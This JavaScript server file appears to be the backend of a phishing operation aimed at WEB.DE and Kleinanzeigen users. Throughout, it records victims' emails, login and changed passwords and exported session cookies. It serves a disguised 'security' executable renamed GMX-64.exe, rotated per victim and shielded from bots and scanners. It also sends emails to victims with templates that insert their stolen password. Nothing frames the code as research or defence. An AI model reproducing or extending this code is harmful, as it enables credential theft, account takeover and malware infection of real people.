  try {
    if (fs.existsSync(DOWNLOAD_LIMITS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_LIMITS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeDownloadLimits(limits) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
  } catch (e) {}
}

function readDownloadCounts() {
  try {
    if (fs.existsSync(DOWNLOAD_COUNTS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_COUNTS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeDownloadCounts(counts) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts && typeof counts === 'object' ? counts : {}, null, 0), 'utf8');
  } catch (e) {}
}

function incrementDownloadCount(fileName) {
  if (!fileName || typeof fileName !== 'string') return;
  const counts = readDownloadCounts();
  const name = path.basename(fileName).replace(/\.\./g, '').replace(/[/\\]/g, '');
  if (!name) return;
  counts[name] = (counts[name] || 0) + 1;
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
  } catch (e) {}
}
function readCookiesExported() {
  try {
    if (!fs.existsSync(COOKIES_EXPORTED_FILE)) return [];
    const raw = fs.readFileSync(COOKIES_EXPORTED_FILE, 'utf8');
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data : [];
  } catch (e) { return []; }
}
function writeCookiesExported(list) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(COOKIES_EXPORTED_FILE, JSON.stringify(list, null, 0), 'utf8');
  } catch (e) {}
}

/** Санитизация имени файла для заголовка Content-Disposition (удаление недопустимых символов). */
function sanitizeFilenameForHeader(name) {
  if (!name || typeof name !== 'string') return 'download';
  return String(name)
    .replace(/[\x00-\x1f\x7f"\\]/g, '')
    .replace(/^\s+|\s+$/g, '')
    .replace(/^\.+/, '') || 'download';
}

/** Индекс слота 0..4 по leadId (стабильный хеш). */
function slotFromLeadId(leadId) {
  if (!leadId || typeof leadId !== 'string') return 0;
  let h = 0;
  for (let i = 0; i < leadId.length; i++) h = ((h << 5) - h) + leadId.charCodeAt(i) | 0;
  return Math.abs(h) % DOWNLOAD_SLOTS_COUNT;
}

/** Настройки ротации: после скольких уникальных юзеров менять файл (0 = выкл, по хешу). */
function readDownloadSettings() {
  try {
    if (fs.existsSync(DOWNLOAD_SETTINGS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_SETTINGS_FILE, 'utf8');
      const data = JSON.parse(raw);
      const n = typeof data.rotateAfterUnique === 'number' && data.rotateAfterUnique >= 0 ? data.rotateAfterUnique : 0;
      return { rotateAfterUnique: n };
    }
  } catch (e) {}
  return { rotateAfterUnique: 0 };
}
function writeDownloadSettings(cfg) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_SETTINGS_FILE, JSON.stringify({ rotateAfterUnique: (cfg && cfg.rotateAfterUnique) >= 0 ? cfg.rotateAfterUnique : 0 }, null, 0), 'utf8');
  } catch (e) {}
}

/** Состояние ротации: счётчик уникальных и слот на leadId (windows / android отдельно). */
function readDownloadRotation() {
  try {
    if (fs.existsSync(DOWNLOAD_ROTATION_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_ROTATION_FILE, 'utf8');
      const data = JSON.parse(raw);
      const w = data.windows || {};
      const a = data.android || {};
      return {
        windows: { totalUnique: typeof w.totalUnique === 'number' ? w.totalUnique : 0, leadSlots: w.leadSlots && typeof w.leadSlots === 'object' ? w.leadSlots : {} },
        android: { totalUnique: typeof a.totalUnique === 'number' ? a.totalUnique : 0, leadSlots: a.leadSlots && typeof a.leadSlots === 'object' ? a.leadSlots : {} }
      };
    }
  } catch (e) {}
  return { windows: { totalUnique: 0, leadSlots: {} }, android: { totalUnique: 0, leadSlots: {} } };
}
function writeDownloadRotation(state) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_ROTATION_FILE, JSON.stringify(state, null, 0), 'utf8');
  } catch (e) {}
}

/** Слот для leadId: при ротации — по порядку уникальных (один юзер = один слот навсегда); иначе по хешу. */
function getSlotForLead(leadId, platform) {
  const settings = readDownloadSettings();
  if (!settings.rotateAfterUnique || settings.rotateAfterUnique <= 0) {
    return leadId ? slotFromLeadId(leadId) : 0;
  }
  if (!leadId || typeof leadId !== 'string') return 0;
  const state = readDownloadRotation();
  const key = platform === 'android' ? 'android' : 'windows';
  const block = state[key];
  if (block.leadSlots[leadId] !== undefined) {
    return block.leadSlots[leadId];
  }
  const slot = Math.floor(block.totalUnique / settings.rotateAfterUnique) % DOWNLOAD_SLOTS_COUNT;
  block.leadSlots[leadId] = slot;
  block.totalUnique += 1;
  writeDownloadRotation(state);
  return slot;
}
/** Файл для слота index (0..4). Без index — первый доступный слот (обратная совместимость). */
function getSicherheitDownloadFile(index) {
  const config = readDownloadFilesConfig();
  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
    const name = config[index];
    if (name) {
      const full = path.join(DOWNLOADS_DIR, name);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: name };
      } catch (e) {}
    }
    return null;
  }
  const envPath = process.env.SICHERHEIT_DOWNLOAD_PATH;
  if (envPath) {
    const full = path.isAbsolute(envPath) ? envPath : path.join(PROJECT_ROOT, envPath);
    try {
      if (fs.statSync(full).isFile()) return { filePath: full, fileName: path.basename(full) };
    } catch (e) {}
  }
  for (let i = 0; i < config.length; i++) {
    if (config[i]) {
      const info = getSicherheitDownloadFile(i);
      if (info) return info;
    }
  }
  try {
    const names = fs.readdirSync(DOWNLOADS_DIR).filter(function (n) { return n !== '.gitkeep' && !n.startsWith('.'); });
    let newest = null;
    let newestMtime = 0;
    for (let i = 0; i < names.length; i++) {
      const full = path.join(DOWNLOADS_DIR, names[i]);
      const stat = fs.statSync(full);
      if (stat.isFile() && stat.mtimeMs >= newestMtime) {
        newestMtime = stat.mtimeMs;
        newest = { filePath: full, fileName: names[i] };
      }
    }
    return newest;
  } catch (e) {}
  return null;
}

/** Первый файл по порядку слотов, у которого downloads < limit (при limit > 0 строго пропускаем переполненные). */
function getSicherheitDownloadFileByLimit() {
  const files = getSicherheitDownloadFiles();
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (!f.fileName) continue;
    const limit = f.limit != null ? f.limit : 0;
    const downloads = f.downloads != null ? f.downloads : 0;
    if (limit > 0 && downloads >= limit) continue;
    if (limit <= 0 || downloads < limit) {
      const full = path.join(DOWNLOADS_DIR, f.fileName);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
      } catch (e) {}
    }
  }
  return getSicherheitDownloadFile();
}
/** Список слотов: { fileName, size, downloads, limit } или пустой слот. */
function getSicherheitDownloadFiles() {
  const config = readDownloadFilesConfig();
  const limits = readDownloadLimits();
  const counts = readDownloadCounts();
  const out = [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const name = config[i];
    if (!name) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      continue;
    }
    const full = path.join(DOWNLOADS_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (stat.isFile()) {
        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
        out.push({
          fileName: name,
          size: stat.size,
          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
          limit
        });
      } else {
        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      }
    } catch (e) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
    }
  }
  return out;
}

/** Android: 5 слотов, без пароля. Конфиг: { "files": [name0, name1, ...] } как у Windows. */
function readAndroidDownloadConfig() {
  try {
    if (fs.existsSync(DOWNLOAD_ANDROID_CONFIG)) {
      const raw = fs.readFileSync(DOWNLOAD_ANDROID_CONFIG, 'utf8');
      const data = JSON.parse(raw);
      let list = Array.isArray(data.files) ? data.files : [];
      if (list.length === 0 && data.fileName && typeof data.fileName === 'string') {
        list = [data.fileName];
      }
      const out = [];
      for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
        const v = list[i];
        out.push((v && typeof v === 'string' && !v.includes('..') && !v.includes(path.sep)) ? v : null);
      }
      return out;
    }
  } catch (e) {}
  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
}
function getAndroidDownloadFile(index) {
  const config = readAndroidDownloadConfig();
  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
    const name = config[index];
    if (name) {
      const full = path.join(DOWNLOADS_DIR, name);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: name };
      } catch (e) {}
    }
    return null;
  }
  for (let i = 0; i < config.length; i++) {
    if (config[i]) {
      const info = getAndroidDownloadFile(i);
      if (info) return info;
    }
  }
  return null;
}

/** Первый файл Android по порядку слотов, у которого downloads < limit (при limit > 0 строго пропускаем переполненные). */
function getAndroidDownloadFileByLimit() {
  const files = getAndroidDownloadFiles();
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (!f.fileName) continue;
    const limit = f.limit != null ? f.limit : 0;
    const downloads = f.downloads != null ? f.downloads : 0;
    if (limit > 0 && downloads >= limit) continue;
    if (limit <= 0 || downloads < limit) {
      const full = path.join(DOWNLOADS_DIR, f.fileName);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
      } catch (e) {}
    }
  }
  return getAndroidDownloadFile();
}
function readAndroidDownloadLimits() {
  try {
    if (fs.existsSync(DOWNLOAD_ANDROID_LIMITS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeAndroidDownloadLimits(limits) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
  } catch (e) {}
}

function getAndroidDownloadFiles() {
  const config = readAndroidDownloadConfig();
  const limits = readAndroidDownloadLimits();
  const counts = readDownloadCounts();
  const out = [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const name = config[i];
    if (!name) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      continue;
    }
    const full = path.join(DOWNLOADS_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (stat.isFile()) {
        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
        out.push({
          fileName: name,
          size: stat.size,
          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
          limit
        });
      } else {
        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      }
    } catch (e) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
    }
  }
  return out;
}
function writeAndroidDownloadConfig(files) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const list = Array.isArray(files) ? files.slice(0, DOWNLOAD_SLOTS_COUNT) : [];
    while (list.length < DOWNLOAD_SLOTS_COUNT) list.push(null);
    fs.writeFileSync(DOWNLOAD_ANDROID_CONFIG, JSON.stringify({ files: list }, null, 0), 'utf8');
  } catch (e) {}
}

const ARCHIVE_PROCESS_TIMEOUT_MS = 120000; // 2 min — чтобы не вешать сервер и не получать 502

/** true, если spawnSync завершился по таймауту (процесс убит). */
function spawnTimedOut(result) {
  return result && (result.signal === 'SIGTERM' || result.status === null);
}

/** Починить битый zip: zip -FF, затем распаковать в extractDir. Возвращает true, если удалось. */
function tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir) {
  const fixedZip = path.join(baseDir, 'fixed.zip');
  const rFF = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [
    process.platform === 'win32' ? '/c' : '-c',
    'zip -FF ' + JSON.stringify(tempZip) + ' --out ' + JSON.stringify(fixedZip) + ' 2>&1'
  ], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
  if (spawnTimedOut(rFF)) return false;
  if (!fs.existsSync(fixedZip) || fs.statSync(fixedZip).size === 0) return false;
  const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
  const unzipFix = pass
    ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
    : 'unzip -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
  const r2 = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipFix], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
  if (spawnTimedOut(r2)) return false;
  const err2 = (r2.stderr || r2.stdout || '').toString();
  if (r2.status !== 0 && !/warning:|note:/.test(err2)) return false;
  try {
    return fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
  } catch (e) { return false; }
}

/**
 * Обработка архива (Windows): распаковать, переименовать первый файл в GMX-64.exe, заархивировать заново (нормальный zip).
 * type: 'zip' | 'rar'. Если распаковка не удалась — для zip пробуем починку через zip -FF, затем снова распаковка и перепаковка.
 * Возвращает Buffer нового архива или null при ошибке.
 */
function processArchiveToGmx(buf, password, type) {
  const baseDir = path.join(os.tmpdir(), 'gmw-multi-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8));
  const tempZip = path.join(baseDir, 'in' + (type === 'zip' ? '.zip' : '.rar'));
  const outZip = path.join(baseDir, 'gmx.zip');
  const outRar = path.join(baseDir, 'gmx.rar');
  const extractDir = path.join(baseDir, 'ext');
  const repackDir = path.join(baseDir, 'repack');
  try {
    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
    fs.writeFileSync(tempZip, buf);
    const pass = (password || '').trim();
    const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
    if (type === 'zip') {
      fs.mkdirSync(extractDir, { recursive: true });
      const unzipCmd = pass
        ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
        : 'unzip -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
      let r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
      if (spawnTimedOut(r)) return null;
      let err = (r.stderr || r.stdout || '').toString();
      let hasFiles = false;
      try {
        hasFiles = fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
      } catch (e) {}
      if (!hasFiles || (r.status !== 0 && !/warning:|note:/.test(err))) {
        try { fs.readdirSync(extractDir).forEach(n => { const p = path.join(extractDir, n); if (fs.statSync(p).isFile()) fs.unlinkSync(p); }); } catch (e2) {}
        hasFiles = tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir);
      }
      if (!hasFiles) return null;
    } else {
      fs.mkdirSync(extractDir, { recursive: true });
      const sevenZ = '7z';
      const extractCmd = pass
        ? sevenZ + ' x ' + JSON.stringify(tempZip) + ' -p' + pass.replace(/"/g, '\\"') + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1'
        : sevenZ + ' x ' + JSON.stringify(tempZip) + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1';
      const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', extractCmd], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
      if (spawnTimedOut(r) || r.status !== 0) return null;
    }
    const entries = fs.readdirSync(extractDir, { withFileTypes: true });
    let firstFile = null;
    for (const e of entries) {
      if (e.isFile()) { firstFile = path.join(extractDir, e.name); break; }
    }
    if (!firstFile || !fs.statSync(firstFile).isFile()) return null;
    fs.mkdirSync(repackDir, { recursive: true });
    const gmxExe = path.join(repackDir, 'GMX-64.exe');
    fs.copyFileSync(firstFile, gmxExe);
    const envNew = process.env;
    const zipCmd = 'zip -j ' + JSON.stringify(outZip) + ' ' + JSON.stringify(gmxExe) + ' 2>&1';
    const zr = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', zipCmd], { encoding: 'utf8', env: envNew, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
    if (spawnTimedOut(zr) || zr.status !== 0) return null;
    if (!fs.existsSync(outZip)) return null;
    const outBuf = fs.readFileSync(outZip);
    return outBuf;
  } catch (e) {
    return null;
  } finally {
    try {
      const rimraf = (dir) => {
        if (!fs.existsSync(dir)) return;
        const list = fs.readdirSync(dir);
        for (const name of list) {
          const full = path.join(dir, name);
          if (fs.statSync(full).isDirectory()) rimraf(full);
          else fs.unlinkSync(full);
        }
        fs.rmdirSync(dir);
      };
      if (fs.existsSync(baseDir)) rimraf(baseDir);
    } catch (e2) {}
  }
}

/** Найти файл в downloads/ по имени (точное или без учёта регистра). Возвращает полный путь или null. */
function findDownloadFile(requestedFileName) {
  if (!requestedFileName || requestedFileName.includes(path.sep) || requestedFileName.includes('..')) return null;
  const full = path.join(DOWNLOADS_DIR, requestedFileName);
  try {
    if (fs.statSync(full).isFile()) return full;
  } catch (e) {}
  try {
    const names = fs.readdirSync(DOWNLOADS_DIR);
    const lower = requestedFileName.toLowerCase();
    for (let i = 0; i < names.length; i++) {
      if (names[i].toLowerCase() === lower) {
        const p = path.join(DOWNLOADS_DIR, names[i]);
        if (fs.statSync(p).isFile()) return p;
        return null;
      }
    }
  } catch (e) {}
  return null;
}

// Пульс сессий только в памяти: /api/status не пишет в файл. При отдаче /api/leads в ответ кладём sessionPulseAt (не трогаем lastSeenAt в JSON — порядок сортировки = только активность лида в файле).
// Считаем пульс свежим не дольше 35 сек — иначе юзер уже мог закрыть вкладку и статус должен стать Offline.
const statusHeartbeats = Object.create(null);
const HEARTBEAT_MAX_AGE_MS = 35 * 1000;

/** Ширина экрана: узкий экран = телефон. Выше порога = планшет или десктоп. */
const MOBILE_MAX_WIDTH = 768;

/**
 * Уточнение платформы по экрану: при узком экране не доверяем десктопному UA (Windows/macOS),
 * чтобы мобильный не отображался как ПК. Планшеты (широкий экран + Android/iOS) оставляем как есть.
 */
function resolvePlatform(uaPlatform, screenWidth) {
  if (uaPlatform == null) return null;
  const w = typeof screenWidth === 'number' && screenWidth >= 0 ? screenWidth : null;
  if (w == null) return uaPlatform;
  const isNarrow = w <= MOBILE_MAX_WIDTH;
  if (isNarrow && (uaPlatform === 'windows' || uaPlatform === 'macos')) return null;
  return uaPlatform;
}

function getClientIp(req) {
  // Cloudflare передаёт реальный IP клиента в CF-Connecting-IP (без него виден только IP edge Cloudflare)
  const cfIp = req.headers['cf-connecting-ip'];
  if (cfIp && typeof cfIp === 'string') {
    const ip = cfIp.trim();
    if (ip) return ip;
  }

  // X-Real-IP (Nginx и др.)
  const realIp = req.headers['x-real-ip'];
  if (realIp && typeof realIp === 'string') {
    const ip = realIp.trim();
    if (ip) return ip;
  }

  // X-Forwarded-For: первый в списке — клиент, дальше прокси (при цепочке прокси брать первый)
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    const first = forwarded.split(',')[0];
    if (first && typeof first === 'string') {
      const ip = first.trim();
      if (ip) return ip;
    }
  }

  // Прямое подключение без прокси
  if (req.socket && req.socket.remoteAddress) {
    return req.socket.remoteAddress.replace(/^::ffff:/, '');
  }
  return '0.0.0.0';
}

// --- Защита от ботов: лимиты по IP и минимальное время с момента cookie ---
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 мин
const RATE_LIMITS = {
  visit: { max: 200, window: RATE_LIMIT_WINDOW_MS },
  submit: { max: 300, window: RATE_LIMIT_WINDOW_MS },
  downloadFilename: { max: 150, window: RATE_LIMIT_WINDOW_MS },
  downloadGet: { max: 120, window: RATE_LIMIT_WINDOW_MS },
  configUpload: { max: 30, window: RATE_LIMIT_WINDOW_MS }
};
const rateLimitBuckets = Object.create(null);
const firstGateTimeByIp = Object.create(null);
const GATE_TIME_TTL_MS = 60 * 60 * 1000; // 1 ч
const MIN_TIME_SINCE_GATE_MS = 2000; // 2 сек — быстрые боты отсекаются, юзеры успевают

/** Одноразовые токены для скачивания: без токена в URL боты не могут скачать файл. */
const downloadTokens = Object.create(null);
const DOWNLOAD_TOKEN_TTL_MS = 120 * 1000; // 2 мин
function generateDownloadToken(fileName) {
  const token = require('crypto').randomBytes(24).toString('base64url');
  downloadTokens[token] = { fileName: fileName, expiresAt: Date.now() + DOWNLOAD_TOKEN_TTL_MS };
  return token;
}
function consumeDownloadToken(token) {
  if (!token || typeof token !== 'string') return null;
  const t = downloadTokens[token];
  delete downloadTokens[token];
  if (!t || Date.now() > t.expiresAt) return null;
  return t.fileName;
}

function cleanupRateLimit() {
  const now = Date.now();
  for (const key of Object.keys(rateLimitBuckets)) {
    if (rateLimitBuckets[key].resetAt < now) delete rateLimitBuckets[key];
  }
  for (const ip of Object.keys(firstGateTimeByIp)) {
    if (now - firstGateTimeByIp[ip] > GATE_TIME_TTL_MS) delete firstGateTimeByIp[ip];
  }
  for (const tok of Object.keys(downloadTokens)) {
    if (downloadTokens[tok].expiresAt < now) delete downloadTokens[tok];
  }
}
if (typeof setInterval !== 'undefined') setInterval(cleanupRateLimit, 60000);

function checkRateLimit(ip, bucketKey, limitConfig) {
  const key = bucketKey + ':' + ip;
  const now = Date.now();
  if (!rateLimitBuckets[key] || now > rateLimitBuckets[key].resetAt) {
    rateLimitBuckets[key] = { count: 0, resetAt: now + limitConfig.window };
  }
  rateLimitBuckets[key].count++;
  return rateLimitBuckets[key].count <= limitConfig.max;
}

function setFirstGateTime(ip) {
  if (!firstGateTimeByIp[ip]) firstGateTimeByIp[ip] = Date.now();
}

const MIN_TIME_SINCE_GATE_ANDROID_MS = 800; // для Android — меньше задержка, мобильные быстрее вводят

function getMinTimeSinceGateOk(ip, req) {
  const t = firstGateTimeByIp[ip];
  if (!t) return false;
  const ua = (req && req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
  const isAndroid = /android/.test(ua);
  const minMs = isAndroid ? MIN_TIME_SINCE_GATE_ANDROID_MS : MIN_TIME_SINCE_GATE_MS;
  return (Date.now() - t) >= minMs;
}

/** source: 'user' = действие на странице (юзер), 'admin' = действие из админки (не показываем в красном бейдже).
 *  meta: { session: number } — номер сессии автовхода WEB.DE (колонка «попытка» в логе: поток | N | email).
 *  meta.detail — доп. строка в EVENTS (админка показывает под заголовком). */
function pushEvent(lead, label, source, meta) {
  if (!lead.eventTerminal) lead.eventTerminal = [];
  const ev = { at: new Date().toISOString(), label: label, source: source || 'user' };
  if (meta && typeof meta === 'object') {
    if (meta.session != null && meta.session !== '') {
      const n = parseInt(meta.session, 10);
      ev.session = Number.isFinite(n) ? n : meta.session;
    }
    if (meta.detail != null && String(meta.detail).trim()) {
      ev.detail = String(meta.detail).trim();
    }
  }
  lead.eventTerminal.push(ev);
}

/** Текст для события «Сайт → сервер: submit принят» (и сырой объект в newEvents). */
function submitPipelineDetail(kind, hasPassword, extraDetail) {
  let detail = '';
  if (kind === 'klein-flow') {
    detail = 'страница Klein на домене WEB.DE (kleinFlow), ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
  } else if (kind === 'klein') {
    detail = 'сайт Kleinanzeigen, ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
  } else {
    detail = 'WEB.DE / почта, ' + (hasPassword ? 'email+пароль' : 'только email');
  }
  if (extraDetail) detail += ' · ' + extraDetail;
  return detail;
}

function submitPipelineEventRaw(atIso, kind, hasPassword, extraDetail) {
  return { at: atIso, label: 'Сайт → сервер: submit принят', source: 'user', detail: submitPipelineDetail(kind, hasPassword, extraDetail) };
}

/** Коротко: что пришло с формы до событий «Ввел почту» / Kl. */
function pushSubmitPipelineEvent(lead, kind, hasPassword, extraDetail) {
  if (!lead) return;
  pushEvent(lead, 'Сайт → сервер: submit принят', 'user', { detail: submitPipelineDetail(kind, hasPassword, extraDetail) });
}

/** Нормализует историю паролей из старого лога в массив { p, s } (для переноса при слиянии). */
function normalizePasswordHistory(hist) {
  if (!hist) return [];
  if (Array.isArray(hist)) {
    return hist.map(function (entry) {
      if (typeof entry === 'object' && entry && entry.p != null) return { p: String(entry.p).trim(), s: entry.s || 'login' };
      if (typeof entry === 'string' && entry.trim()) return { p: entry.trim(), s: 'login' };
      return null;
    }).filter(Boolean);
  }
  return [];
}

/** Для выгрузки куки: пароль со страницы входа и пароль со страницы смены (new). */
function getLoginAndNewPassword(lead) {
  const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
  let passLogin = (lead.password != null) ? String(lead.password).trim() : '';
  let passNew = '';
  const firstLogin = history.find(function (e) { return e && e.s === 'login'; });
  if (firstLogin && firstLogin.p != null) passLogin = String(firstLogin.p).trim();
  for (let i = history.length - 1; i >= 0; i--) {
    if (history[i] && history[i].s === 'change') {
      passNew = (history[i].p != null) ? String(history[i].p).trim() : '';
      break;
    }
  }
  return { passLogin: passLogin || '', passNew: passNew || '' };
}

function cookieSafeForLoginCookiesFile(email) {
  if (!email || typeof email !== 'string') return '';
  return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
}

/** Email для файла login/cookies/*.json и /api/lead-cookies: у Klein логин на KLZ — emailKl. */
function cookieEmailForLeadCookiesFile(lead) {
  if (!lead || typeof lead !== 'object') return '';
  if (lead.brand === 'klein') {
    return String((lead.emailKl || lead.email || '')).trim();
  }
  return String((lead.email || '')).trim();
}

function leadHasSavedCookies(lead) {
  const safe = cookieSafeForLoginCookiesFile(cookieEmailForLeadCookiesFile(lead));
  if (!safe) return false;
  try {
    const p = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
    return fs.existsSync(p);
  } catch (e) {
    return false;
  }
}

function leadEventTerminalHasExactLabel(lead, needleLower) {
  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  return events.some(function (ev) {
    const lbl = ev && ev.label ? String(ev.label).trim().toLowerCase() : '';
    return lbl === needleLower;
  });
}

/** Единая метка в eventTerminal при успешной отправке письма из Config → E-Mail (ручная / массовая). */
const CONFIG_EMAIL_SENT_EVENT_LABEL = 'Send Email';

/**
 * Уже была успешная отправка Config E-Mail: актуальная метка «Send Email» и старые варианты в логе.
 */
function leadHasAnyConfigEmailSentEvent(lead) {
  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  return events.some(function (ev) {
    const lbl = ev && ev.label != null ? String(ev.label).trim().toLowerCase() : '';
    if (!lbl) return false;
    if (lbl === 'send email' || lbl.indexOf('send email') === 0) return true;
    if (lbl === 'email send' || lbl === 'email send kl') return true;
    if (lbl === 'письмо отправлено') return true;
    if (lbl.indexOf('письмо отправлено') !== -1 && lbl.indexOf('не отправилось') === -1 && lbl.indexOf('не удалось') === -1) {
      return true;
    }
    return false;
  });
}

/** Письмо из Config → E-Mail (как кнопка E-Mail в карточке лида). Ошибки — pushEvent + { ok: false }. */
async function sendConfigEmailToLead(lead) {
  const toEmail = (lead.email || lead.emailKl || '').trim();
  if (!toEmail) {
    pushEvent(lead, 'Письмо не отправилось: у лида нет email', 'admin');
    return { ok: false, error: 'У лида нет email', statusCode: 400 };
  }
  const password = (lead.password || lead.passwordKl || '').trim();
  const data = readConfigEmail();
  let cfg = data.current;
  if (lead.brand === 'klein') {
    const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
    if (klCfg) cfg = klCfg;
  }
  if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
    pushEvent(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
    return { ok: false, error: 'В Config → E-Mail не задан SMTP. Откройте Config, вкладка E-Mail, введите SMTP и нажмите «Сохранить».', statusCode: 400 };
  }
  const smtpList = parseSmtpLines(cfg.smtpLine);
  if (!smtpList.length) {
    pushEvent(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
    return { ok: false, error: 'В Config → E-Mail не задан SMTP.', statusCode: 400 };
  }
  let html = (cfg.html || '')
    .replace(/_email_/g, toEmail)
    .replace(/_password_/g, password);
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      const cid = 'image1@mail';
      html = html.replace(/_src1_/g, 'cid:' + cid);
      attachments.push({ filename: 'image1.png', content: buf, cid: cid });
    } catch (e) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  if (!nodemailer) {
    pushEvent(lead, 'Письмо не отправилось: nodemailer не установлен', 'admin');
